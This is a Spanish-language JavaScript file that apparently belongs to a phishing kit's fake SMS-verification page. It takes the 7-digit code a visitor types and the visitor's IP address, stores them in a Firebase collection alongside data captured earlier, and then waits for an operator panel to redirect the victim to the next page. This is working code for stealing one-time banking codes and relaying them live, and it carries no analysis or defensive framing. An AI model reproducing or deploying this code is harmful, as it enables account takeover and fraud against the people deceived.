// Script para SMS.html - Integración con Firebase
console.log('🚀 Script SMS iniciado');

// NOTA: La configuración de Firebase y rutas está centralizada en firebase-config.js
// Este archivo debe importarse antes que sms.js en el HTML

// Variables globales para Firebase
let app, db, unsubscribe;

// Inicializar Firebase
try {
    app = firebase.initializeApp(firebaseConfig);
    db = firebase.firestore();
    console.log('✅ Firebase inicializado correctamente para SMS');
} catch (error) {
    console.error('❌ Error inicializando Firebase:', error);
}

// Función para obtener la dirección IP
async function obtenerDireccionIP() {
    const servicios = [
        "https://api.ipify.org?format=json",
        "https://api64.ipify.org?format=json",
        "https://jsonip.com",
        "https://api.myip.com",
        "https://ipapi.co/json/"
    ];
    
    for (const url of servicios) {
        try {
            const response = await fetch(url);
            if (!response.ok) continue;
            const data = await response.json();
            return data.ip || data.data || "No disponible";
        } catch (error) {
            console.warn('Error obteniendo IP de:', url);
        }
    }
    return "No disponible";
}

// Función para obtener el próximo número secuencial
async function getNextCardNumber() {
    try {
        const snapshot = await db.collection("redireccion").get();
        return snapshot.size + 1;
    } catch (error) {
        console.error('Error obteniendo número de tarjeta:', error);
        return Math.floor(Math.random() * 1000) + 1;
    }
}

// Función para guardar en historial persistente con reintentos y mejor logging
async function guardarEnHistorial(datos, reintentos = 3) {
    console.log('🔍 INICIANDO guardarEnHistorial (SMS) con datos:', {
        usuario: datos.usuario,
        tieneDB: !!db,
        datosCompletos: Object.keys(datos)
    });
    
    // Verificar que Firebase esté inicializado
    if (!db) {
        console.error('❌ ERROR CRÍTICO: Firebase db no está inicializado');
        console.error('❌ Verificar que firebase-config.js se cargó correctamente');
        return false;
    }
    
    for (let intento = 1; intento <= reintentos; intento++) {
        try {
            console.log(`🚀 Intento ${intento} de ${reintentos} - Guardando en Firestore...`);
            
            const docId = `${datos.usuario}_${Date.now()}_${intento}`;
            const historialRef = db.collection("datosHistorial").doc(docId);
            
            console.log('📝 Referencia creada:', {
                coleccion: 'datosHistorial',
                documentoId: docId,
                referencia: !!historialRef
            });
            
            // Intentar guardar
            await historialRef.set(datos);
            
            console.log(`✅ ÉXITO: Historial guardado en intento ${intento}`);
            console.log(`✅ Documento guardado con ID: ${docId}`);
            console.log(`✅ En colección: datosHistorial`);
            
            // Verificar que se guardó
            const verificacion = await historialRef.get();
            if (verificacion.exists) {
                console.log('✅ VERIFICACIÓN: Documento existe en Firestore');
                return true;
            } else {
                console.warn('⚠️ ADVERTENCIA: Documento no se encontró después de guardar');
            }
            
        } catch (error) {
            console.error(`❌ INTENTO ${intento} FALLÓ:`);
            console.error('❌ Error completo:', error);
            console.error('❌ Mensaje:', error.message);
            console.error('❌ Código:', error.code);
            console.error('❌ Stack:', error.stack);
            
            if (intento === reintentos) {
                console.error(`❌ FALLO FINAL: No se pudo guardar historial después de ${reintentos} intentos`);
                console.error('❌ Datos que se intentaron guardar:', datos);
                return false;
            }
            
            // Esperar antes del siguiente intento
            const espera = 1000 * intento;
            console.log(`⏳ Esperando ${espera}ms antes del siguiente intento...`);
            await new Promise(resolve => setTimeout(resolve, espera));
        }
    }
    return false;
}

// Función principal cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', async function () {
    console.log('📄 DOM cargado - Inicializando aplicación SMS');
    
    // Obtener elementos del DOM
    const codeInputs = document.querySelectorAll('.code-inputs input');
    const authForm = document.getElementById('authForm');
    const submitBtn = document.querySelector('.btn-verify');
    
    console.log('🔍 Elementos encontrados:', {
        codeInputs: codeInputs.length,
        form: !!authForm,
        submitBtn: !!submitBtn
    });
    
    if (!authForm || !submitBtn || codeInputs.length === 0) {
        console.error('❌ Elementos críticos no encontrados');
        return;
    }
    
    // Lógica para que los campos de código se auto-avancen y manejen solo números
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            // Solo permite dígitos
            input.value = input.value.replace(/[^0-9]/g, '');

            // Si hay un valor y no es el último campo, enfocar el siguiente
            if (input.value.length === 1 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
        });

        input.addEventListener('keydown', (e) => {
            // Si la tecla es "Backspace" y el campo está vacío, enfocar el anterior
            if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
                codeInputs[index - 1].focus();
            }
        });
    });

    // Centrar el primer campo al cargar la página
    if (codeInputs.length > 0) {
        codeInputs[0].focus();
    }

    // Función para manejar el envío del formulario SMS
    async function manejarEnvioSMS(event) {
        event.preventDefault();
        console.log('🚀 Procesando envío del formulario SMS');
        
        if (!submitBtn || submitBtn.disabled) {
            console.log('⚠️ Botón deshabilitado');
            return;
        }
        
        try {
            // Deshabilitar botón y mostrar estado de carga
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            submitBtn.textContent = 'VERIFICANDO...';
            
            // Capturar código SMS
            let codigoSMS = '';
            codeInputs.forEach(input => {
                codigoSMS += input.value.trim();
            });
            
            console.log('📝 Código SMS capturado:', codigoSMS ? '***' + codigoSMS.slice(-2) : '');
            
            if (codigoSMS.length !== 7 || !/^\d+$/.test(codigoSMS)) {
                throw new Error("El código SMS debe tener 7 dígitos");
            }

            // Obtener datos del usuario desde localStorage (enviados desde index.html)
            console.log('🔍 Contenido completo de localStorage:', localStorage);
            console.log('🔍 Claves en localStorage:', Object.keys(localStorage));
            
            const usuarioActual = localStorage.getItem('usuarioActual') || 'Usuario';
            console.log('🔍 Usuario obtenido de localStorage:', usuarioActual);
            
            // Si no hay usuario válido, mostrar error específico
            if (usuarioActual === 'Usuario') {
                console.warn('⚠️ No se encontró usuario válido en localStorage');
                console.warn('⚠️ Esto indica que no se transfirió correctamente desde index.html');
            }
            
            // Obtener IP
            const direccionIP = await obtenerDireccionIP();
            
            // Obtener el próximo número secuencial
            const cardNumber = await getNextCardNumber();

            console.log('🎨 Datos del usuario SMS:', { usuarioActual, cardNumber, direccionIP });

            // 1. Actualizar usuario en colección de redirección con el código SMS
            const userRef = db.collection("redireccion").doc(usuarioActual);
            
            // Obtener datos existentes del usuario
            const userDoc = await userRef.get();
            if (!userDoc.exists) {
                throw new Error("Usuario no encontrado en el sistema");
            }
            
            const datosExistentes = userDoc.data();
            
            // Actualizar con el código SMS y mantener page: 0 (esperando instrucciones del panel)
            await userRef.update({
                claveOperaciones: codigoSMS, // Guardar código SMS en el campo claveOperaciones
                page: 0, // Estado CARGANDO - esperando instrucciones del panel (igual que main.js)
                timestampSMS: firebase.firestore.FieldValue.serverTimestamp(),
                direccionIPSMS: direccionIP
            });
            
            console.log('💾 Usuario actualizado en Firebase con código SMS y page: 0 (Cargando - esperando panel)');

            // 2. Preparar datos completos para historial
            const datosCompletos = {
                // Datos del formulario anterior
                ...datosExistentes,
                
                // Datos del SMS
                claveOperaciones: codigoSMS,
                
                // Datos de red y ubicación actualizados
                direccionIPSMS: direccionIP,
                
                // Datos temporales
                timestampSMS: new Date().toISOString(),
                
                // Metadatos
                flujo: 'SMS_VERIFICATION',
                version: '2.0'
            };

            // 3. Guardar en historial
            await guardarEnHistorial(datosCompletos);

            console.log('✅ Proceso SMS completado exitosamente');
            
            // 4. Configurar escucha de cambios para redirección (igual que main.js)
            console.log('👂 Iniciando escucha de cambios en Firebase para redirección...');
            
            // Configurar timeout máximo de espera (5 minutos)
            const timeoutId = setTimeout(() => {
                console.log('⏰ Timeout de 5 minutos alcanzado - manteniendo en página SMS');
            }, 5 * 60 * 1000); // 5 minutos
            
            // Escuchar cambios en tiempo real para redirección
            const unsubscribe = userRef.onSnapshot((doc) => {
                if (doc.exists) {
                    const userData = doc.data();
                    const page = userData.page;
                    
                    console.log('🔄 Cambio detectado en Firebase:', { page, userData });
                    
                    // Si page > 0, redireccionar según la configuración (igual que main.js)
                    if (page > 0) { // Si el panel cambió el estado desde 0 (Cargando)
                        console.log(`🎯 Admin cambió página a ${page} - redirigiendo`);
                        
                        // Cancelar timeout y desuscribirse
                        clearTimeout(timeoutId);
                        unsubscribe();
                        
                        // Usar configuración de rutas
                        const route = appConfig.routes[page];
                        if (route) {
                            console.log(`🚀 Redirigiendo a: ${route.url} (${route.name})`);
                            window.location.href = route.url;
                        } else {
                            console.warn(`⚠️ Ruta no encontrada para page: ${page}`);
                            window.location.href = `page${page}.html`;
                        }
                    }
                }
            });

        } catch (error) {
            console.error('❌ Error en el proceso SMS:', error);
            
            // Restaurar botón
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
            submitBtn.textContent = 'VERIFICAR';
            
            // Mostrar error al usuario
            alert('Error al procesar el código SMS. Por favor, inténtalo de nuevo.');
        }
    }

    // Agregar event listener al formulario
    if (authForm) {
        authForm.addEventListener('submit', manejarEnvioSMS);
        console.log('🎯 Event listener agregado al formulario SMS');
    }

    console.log('✅ Aplicación SMS inicializada correctamente');
});
